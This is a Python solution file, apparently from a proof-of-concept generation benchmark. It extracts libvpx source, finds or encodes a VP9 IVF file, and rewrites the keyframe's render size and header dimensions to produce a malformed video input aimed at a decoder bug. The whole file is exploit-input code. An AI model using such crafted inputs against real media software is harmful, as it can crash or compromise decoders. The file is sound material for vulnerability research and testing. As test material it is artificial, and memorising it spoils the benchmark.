import os
import re
import io
import sys
import tarfile
import time
import shutil
import struct
import tempfile
import subprocess
from typing import Optional, Tuple, List


class _BitReaderMSB:
    __slots__ = ("_data", "_byte_pos", "_bit_pos", "_total_bits")

    def __init__(self, data: bytes):
        self._data = data
        self._byte_pos = 0
        self._bit_pos = 0
        self._total_bits = len(data) * 8

    def bits_left(self) -> int:
        return self._total_bits - (self._byte_pos * 8 + self._bit_pos)

    def read_bit(self) -> int:
        if self._byte_pos >= len(self._data):
            raise EOFError
        b = self._data[self._byte_pos]
        bit = (b >> (7 - self._bit_pos)) & 1
        self._bit_pos += 1
        if self._bit_pos == 8:
            self._bit_pos = 0
            self._byte_pos += 1
        return bit

    def read_bits(self, n: int) -> int:
        v = 0
        for _ in range(n):
            v = (v << 1) | self.read_bit()
        return v


class _BitWriterMSB:
    __slots__ = ("_out", "_cur", "_bit_pos")

    def __init__(self):
        self._out = bytearray()
        self._cur = 0
        self._bit_pos = 0

    def write_bit(self, bit: int) -> None:
        if bit & 1:
            self._cur |= 1 << (7 - self._bit_pos)
        self._bit_pos += 1
        if self._bit_pos == 8:
            self._out.append(self._cur)
            self._cur = 0
            self._bit_pos = 0

    def write_bits(self, v: int, n: int) -> None:
        for i in range(n - 1, -1, -1):
            self.write_bit((v >> i) & 1)

    def get_bytes(self) -> bytes:
        if self._bit_pos:
            self._out.append(self._cur)
        return bytes(self._out)


def _safe_extract_tar(tar: tarfile.TarFile, path: str) -> None:
    base = os.path.realpath(path)
    for m in tar.getmembers():
        name = m.name
        if not name or name.startswith("/") or name.startswith("\\"):
            continue
        dest = os.path.realpath(os.path.join(path, name))
        if not (dest == base or dest.startswith(base + os.sep)):
            continue
        try:
            tar.extract(m, path=path, set_attrs=False)
        except Exception:
            pass


def _maybe_get_repo_root(extract_dir: str) -> str:
    try:
        entries = [e for e in os.listdir(extract_dir) if e not in (".", "..")]
    except Exception:
        return extract_dir
    dirs = [e for e in entries if os.path.isdir(os.path.join(extract_dir, e))]
    files = [e for e in entries if os.path.isfile(os.path.join(extract_dir, e))]
    if len(dirs) == 1 and not files:
        return os.path.join(extract_dir, dirs[0])
    return extract_dir


def _find_files_by_name(root: str, names: Tuple[str, ...]) -> List[str]:
    out = []
    names_set = set(n.lower() for n in names)
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if fn.lower() in names_set:
                out.append(os.path.join(dp, fn))
    return out


def _is_likely_libvpx(root: str) -> bool:
    if os.path.isfile(os.path.join(root, "configure")):
        if os.path.exists(os.path.join(root, "vpx")) or os.path.exists(os.path.join(root, "vpx_ports")):
            return True
    return False


def _read_file(path: str, max_bytes: Optional[int] = None) -> bytes:
    with open(path, "rb") as f:
        if max_bytes is None:
            return f.read()
        return f.read(max_bytes)


def _locate_ivf_candidate(root: str, max_size: int = 300000) -> Optional[str]:
    best = None
    best_sz = None
    for dp, _, fns in os.walk(root):
        for fn in fns:
            if not fn.lower().endswith(".ivf"):
                continue
            p = os.path.join(dp, fn)
            try:
                st = os.stat(p)
            except Exception:
                continue
            if st.st_size <= 0 or st.st_size > max_size:
                continue
            try:
                head = _read_file(p, 32)
            except Exception:
                continue
            if len(head) < 32 or head[:4] != b"DKIF":
                continue
            fourcc = head[8:12]
            if fourcc not in (b"VP90", b"VP80", b"AV01"):
                continue
            if best is None or st.st_size < best_sz:
                best = p
                best_sz = st.st_size
    return best


def _ivf_patch_dims(ivf: bytes, w: int, h: int) -> bytes:
    if len(ivf) < 32 or ivf[:4] != b"DKIF":
        return ivf
    b = bytearray(ivf)
    b[12:14] = struct.pack("<H", w & 0xFFFF)
    b[14:16] = struct.pack("<H", h & 0xFFFF)
    return bytes(b)


def _ivf_parse_frames(ivf: bytes) -> Tuple[bytes, List[Tuple[int, int, bytes]]]:
    if len(ivf) < 32 or ivf[:4] != b"DKIF":
        raise ValueError("not ivf")
    header = ivf[:32]
    frames = []
    off = 32
    n = 0
    while off + 12 <= len(ivf):
        sz = struct.unpack_from("<I", ivf, off)[0]
        ts = struct.unpack_from("<Q", ivf, off + 4)[0]
        off += 12
        if off + sz > len(ivf):
            break
        payload = ivf[off:off + sz]
        frames.append((sz, ts, payload))
        off += sz
        n += 1
        if n > 1024:
            break
    return header, frames


def _ivf_rebuild(header: bytes, frames: List[Tuple[int, int, bytes]]) -> bytes:
    out = bytearray(header)
    for _, ts, payload in frames:
        out += struct.pack("<I", len(payload))
        out += struct.pack("<Q", ts)
        out += payload
    return bytes(out)


def _vp9_add_or_set_render_size(frame: bytes, render_w: int, render_h: int) -> bytes:
    if render_w < 1 or render_h < 1:
        return frame

    br = _BitReaderMSB(frame)
    bw = _BitWriterMSB()
    try:
        frame_marker = br.read_bits(2)
        bw.write_bits(frame_marker, 2)

        profile_low = br.read_bits(1)
        profile_high = br.read_bits(1)
        bw.write_bits(profile_low, 1)
        bw.write_bits(profile_high, 1)
        profile = profile_low | (profile_high << 1)

        if profile == 3:
            reserved = br.read_bits(1)
            bw.write_bits(reserved, 1)

        show_existing_frame = br.read_bits(1)
        bw.write_bits(show_existing_frame, 1)
        if show_existing_frame != 0:
            return frame

        frame_type = br.read_bits(1)
        show_frame = br.read_bits(1)
        error_resilient_mode = br.read_bits(1)
        bw.write_bits(frame_type, 1)
        bw.write_bits(show_frame, 1)
        bw.write_bits(error_resilient_mode, 1)

        if frame_marker != 2:
            return frame

        if frame_type != 0:
            return frame

        sync = br.read_bits(24)
        bw.write_bits(sync, 24)
        if sync != 0x498342:
            return frame

        color_space = br.read_bits(3)
        bw.write_bits(color_space, 3)

        if color_space != 7:
            color_range = br.read_bits(1)
            bw.write_bits(color_range, 1)
            if profile in (1, 3):
                subx = br.read_bits(1)
                suby = br.read_bits(1)
                rsv = br.read_bits(1)
                bw.write_bits(subx, 1)
                bw.write_bits(suby, 1)
                bw.write_bits(rsv, 1)
        else:
            if profile in (1, 3):
                color_range = br.read_bits(1)
                subx = br.read_bits(1)
                suby = br.read_bits(1)
                rsv = br.read_bits(1)
                bw.write_bits(color_range, 1)
                bw.write_bits(subx, 1)
                bw.write_bits(suby, 1)
                bw.write_bits(rsv, 1)

        w_minus_1 = br.read_bits(16)
        h_minus_1 = br.read_bits(16)
        bw.write_bits(w_minus_1, 16)
        bw.write_bits(h_minus_1, 16)

        render_diff = br.read_bits(1)
        bw.write_bits(1, 1)

        if render_diff == 1:
            _ = br.read_bits(16)
            _ = br.read_bits(16)

        bw.write_bits((render_w - 1) & 0xFFFF, 16)
        bw.write_bits((render_h - 1) & 0xFFFF, 16)

        while br.bits_left() > 0:
            bw.write_bit(br.read_bit())

        return bw.get_bytes()
    except Exception:
        return frame


def _build_libvpx_vpxenc(src_root: str, work_dir: str, jobs: int = 8) -> Optional[str]:
    configure = os.path.join(src_root, "configure")
    if not os.path.isfile(configure):
        return None

    build_dir = os.path.join(work_dir, "build_libvpx")
    os.makedirs(build_dir, exist_ok=True)

    try:
        st = os.stat(configure)
        if not (st.st_mode & 0o111):
            os.chmod(configure, st.st_mode | 0o111)
    except Exception:
        pass

    candidates = [
        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-vp8", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools", "--disable-shared", "--enable-static", "--enable-small"],
        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools", "--disable-shared", "--enable-static", "--enable-small"],
        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools", "--disable-shared", "--enable-static"],
        ["bash", configure, "--target=generic-gnu", "--enable-vp9", "--disable-unit-tests", "--disable-examples", "--disable-docs", "--enable-tools"],
    ]

    env = os.environ.copy()
    env.setdefault("CFLAGS", "-O0 -g0")
    env.setdefault("CXXFLAGS", "-O0 -g0")

    ok = False
    for cmd in candidates:
        try:
            r = subprocess.run(cmd, cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=600)
            if r.returncode == 0:
                ok = True
                break
        except Exception:
            continue
    if not ok:
        return None

    try:
        r = subprocess.run(["make", f"-j{max(1, jobs)}", "vpxenc"], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=900)
        if r.returncode != 0:
            r = subprocess.run(["make", f"-j{max(1, jobs)}"], cwd=build_dir, env=env, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=900)
            if r.returncode != 0:
                return None
    except Exception:
        return None

    vpxenc = os.path.join(build_dir, "vpxenc")
    if os.path.isfile(vpxenc):
        return vpxenc
    vpxenc = os.path.join(build_dir, "vpxenc.exe")
    if os.path.isfile(vpxenc):
        return vpxenc
    return None


def _run_vpxenc_make_ivf(vpxenc_path: str, work_dir: str, w: int, h: int) -> Optional[bytes]:
    y4m_path = os.path.join(work_dir, "in.y4m")
    out_path = os.path.join(work_dir, "out.ivf")

    y_plane = bytes([0]) * (w * h)
    uv_plane = bytes([128]) * ((w // 2) * (h // 2))
    header = f"YUV4MPEG2 W{w} H{h} F1:1 Ip A1:1 C420\n".encode("ascii")
    frame_hdr = b"FRAME\n"
    with open(y4m_path, "wb") as f:
        f.write(header)
        f.write(frame_hdr)
        f.write(y_plane)
        f.write(uv_plane)
        f.write(uv_plane)

    cmd_variants = [
        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "--end-usage=q", "--cq-level=63", "--cpu-used=8", "--threads=1", "-o", out_path, y4m_path],
        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "--end-usage=q", "--cq-level=63", "--cpu-used=5", "--threads=1", "-o", out_path, y4m_path],
        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "--good", "--cpu-used=8", "--threads=1", "-o", out_path, y4m_path],
        [vpxenc_path, "--codec=vp9", "--ivf", "--limit=1", "--kf-max-dist=1", "--lag-in-frames=0", "-o", out_path, y4m_path],
    ]

    for cmd in cmd_variants:
        try:
            r = subprocess.run(cmd, cwd=work_dir, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=120)
            if r.returncode == 0 and os.path.isfile(out_path):
                data = _read_file(out_path)
                if data[:4] == b"DKIF":
                    return data
        except Exception:
            continue
    return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        work_dir = tempfile.mkdtemp(prefix="pocgen_")
        extract_dir = os.path.join(work_dir, "src")
        os.makedirs(extract_dir, exist_ok=True)

        try:
            if os.path.isdir(src_path):
                src_root = src_path
            else:
                with tarfile.open(src_path, "r:*") as tar:
                    _safe_extract_tar(tar, extract_dir)
                src_root = _maybe_get_repo_root(extract_dir)

            ivf_candidate = _locate_ivf_candidate(src_root)
            if ivf_candidate:
                ivf = _read_file(ivf_candidate)
                try:
                    header, frames = _ivf_parse_frames(ivf)
                    if frames:
                        sz, ts, payload = frames[0]
                        new_payload = _vp9_add_or_set_render_size(payload, 16, 16)
                        frames[0] = (len(new_payload), ts, new_payload)
                        new_ivf = _ivf_rebuild(header, frames)
                        new_ivf = _ivf_patch_dims(new_ivf, 16, 16)
                        return new_ivf
                except Exception:
                    ivf = _ivf_patch_dims(ivf, 16, 16)
                    return ivf

            if _is_likely_libvpx(src_root):
                vpxenc = _build_libvpx_vpxenc(src_root, work_dir, jobs=min(8, (os.cpu_count() or 2)))
                if vpxenc:
                    ivf = _run_vpxenc_make_ivf(vpxenc, work_dir, w=64, h=64)
                    if ivf and ivf[:4] == b"DKIF":
                        try:
                            header, frames = _ivf_parse_frames(ivf)
                            if frames:
                                sz, ts, payload = frames[0]
                                new_payload = _vp9_add_or_set_render_size(payload, 16, 16)
                                frames[0] = (len(new_payload), ts, new_payload)
                                out = _ivf_rebuild(header, frames)
                                out = _ivf_patch_dims(out, 16, 16)
                                return out
                        except Exception:
                            return _ivf_patch_dims(ivf, 16, 16)

            fallback = bytearray()
            fallback += b"DKIF"
            fallback += struct.pack("<HH", 0, 32)
            fallback += b"VP90"
            fallback += struct.pack("<HH", 16, 16)
            fallback += struct.pack("<IIII", 1, 1, 1, 0)
            fallback += struct.pack("<I", 0) + struct.pack("<Q", 0)
            return bytes(fallback)
        finally:
            try:
                shutil.rmtree(work_dir, ignore_errors=True)
            except Exception:
                pass